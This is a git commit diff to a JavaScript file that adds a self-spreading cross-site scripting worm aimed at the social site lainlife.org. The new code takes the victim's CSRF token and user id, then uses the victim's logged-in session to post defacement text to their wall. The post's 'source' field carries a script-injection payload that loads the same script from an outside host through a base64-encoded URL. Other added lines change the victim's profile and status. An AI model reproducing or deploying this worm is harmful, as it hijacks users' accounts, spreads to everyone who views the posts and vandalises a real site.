98dcb0e438e5fe10cad51c60152897a707794570
chopchoker <donkeyfucker@atomicmail.io>
2026-09-14 13:29:35 +0000

    Update 0.js

--- 0.js
+++ 0.js
@@ -20,6 +20,28 @@ async function makePost(csrf) {
   })).text();
 }
 
+async function worm(csrf, myid) {
+  await (await fetch(`https://lainlife.org/wall${myid}/makePost`, {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "X-OpenVK-Ajax-Query": "1",
+        "Content-Type": "multipart/form-data; boundary=----geckoformboundary79e487d579b3830a84fd35791a059fa0",
+        "Sec-GPC": "1",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+        "Priority": "u=0"
+    },
+    "referrer": `https://lainlife.org/id${myid}`,
+    "body": `------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"text\"\r\n\r\nHacked By Donkey Fucker\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"horizontal_attachments\"\r\n\r\n\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"vertical_attachments\"\r\n\r\n\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"poll\"\r\n\r\nnone\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"source\"\r\n\r\nhttps://example.com?q=\"><script>document.body.appendChild(Object.assign(document.createElement('script'),{src:atob('aHR0cHM6Ly9jaG9wY2hva2VyLmdpdGh1Yi5pby8wLmpz')}));</script>\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"geo\"\r\n\r\n\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\n1\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0\r\nContent-Disposition: form-data; name=\"hash\"\r\n\r\n${csrf}\r\n------geckoformboundary79e487d579b3830a84fd35791a059fa0--\r\n`,
+    "method": "POST",
+    "mode": "cors"
+  })).text();
+}
+
 async function getCSRF() {
   const text = await (await fetch("https://lainlife.org/id625", {
     "credentials": "include",
@@ -40,6 +62,28 @@ async function getCSRF() {
     "mode": "cors"
   })).text();
   return text.split(`<meta name="csrf" value="`)[1].split(`" />`)[0]
+}
+
+async function getID() {
+  const text = await (await fetch("https://lainlife.org/id625", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Sec-GPC": "1",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-User": "?1",
+        "Priority": "u=0, i"
+    },
+    "referrer": "https://lainlife.org/id625",
+    "method": "GET",
+    "mode": "cors"
+  })).text();
+  return text.split(`<a href="/friends`)[1].split(`"`)[0]
 }
 
 async function setStatus(csrf, status) {
@@ -87,10 +131,12 @@ async changeProfile(csrf) {
 
 async function hack() {
   const csrf = await getCSRF();
-  console.log('csrf', csrf);
+  const userid = await getID();
+  console.log('csrf', csrf, 'id', userid);
   await makePost(csrf);
   await changeProfile(csrf);
   await setStatus(csrf, 'Lets all love Donkey Fucker!!! I\'m his fan.');
+  await worm(csrf, userid);
 };
 
 hack();
